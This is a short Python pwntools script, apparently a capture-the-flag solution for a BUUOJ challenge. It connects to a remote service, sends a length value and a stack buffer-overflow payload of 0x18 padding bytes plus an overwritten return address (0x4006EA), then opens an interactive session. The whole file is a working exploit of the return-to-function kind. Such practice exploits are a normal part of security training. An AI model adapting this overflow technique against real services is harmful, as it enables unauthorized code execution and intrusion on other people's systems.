from pwn import *

q = remote('node5.buuoj.cn',25096)

payload = b'a'*(0x10+8)+p64(0x4006EA)

q.sendline('100')
q.sendline(payload)

q.interactive()
